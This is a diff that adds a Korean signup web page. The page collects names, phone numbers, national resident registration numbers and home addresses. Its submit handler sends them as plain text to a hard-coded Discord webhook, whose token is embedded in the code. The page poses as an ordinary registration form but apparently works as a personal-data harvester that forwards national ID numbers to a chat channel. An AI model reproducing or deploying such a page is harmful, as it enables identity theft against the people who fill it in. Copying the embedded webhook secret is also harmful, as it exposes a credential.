@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>회원가입</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+
+        h1 {
+            text-align: center;
+            color: #7289da;
+        }
+
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        label {
+            margin-bottom: 8px;
+            display: block;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #5b6eae;
+        }
+
+        .alert {
+            text-align: center;
+            margin-top: 10px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <h1>회원가입</h1>
+    <form id="signupForm">
+        <label for="name">이름</label>
+        <input type="text" id="name" name="name" required pattern="^[가-힣a-zA-Z\s]+$" title="이름은 한글 또는 영어로만 입력할 수 있습니다.">
+
+        <label for="phone">전화번호 (형식: 01012345678 또는 11234567890)</label>
+        <input type="text" id="phone" name="phone" required pattern="^(\+82-10\d{8}|010\d{8}|\+1\d{10}|01\d{10}|1\d{10})$" title="형식: 01012345678 또는 11234567890">
+
+        <label for="idNumber">주민등록번호 (형식: 123456-1234567)</label>
+        <input type="text" id="idNumber" name="idNumber" required pattern="^\d{6}-\d{7}$" title="형식: 123456-1234567">
+
+        <label for="address">사는 곳</label>
+        <input type="text" id="address" name="address" required>
+
+        <label for="photo">사진 업로드 (선택)</label>
+        <input type="file" id="photo" name="photo">
+
+        <button type="submit">회원가입</button>
+        <div class="alert" id="alertMessage"></div>
+    </form>
+
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const idNumber = document.getElementById('idNumber').value;
+            const address = document.getElementById('address').value;
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1305107877207347200/pNXNeISGYgP7UmlX2yRwnkGao_Y8f9CiVE0AlHh8Qpi3evEmvsZp3vG2U1ipi4r5jMZc';
+            const messageContent = `이름: ${name}\n전화번호: ${phone}\n주민등록번호: ${idNumber}\n사는 곳: ${address}`;
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: messageContent })
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('alertMessage').innerText = '회원가입이 완료되었습니다!';
+                    document.getElementById('alertMessage').style.color = 'green';
+                } else {
+                    document.getElementById('alertMessage').innerText = '회원가입 중 오류가 발생했습니다.';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('alertMessage').innerText = '전송 중 오류가 발생했습니다.';
+            });
+        });
+    </script>
+</body>
+</html>
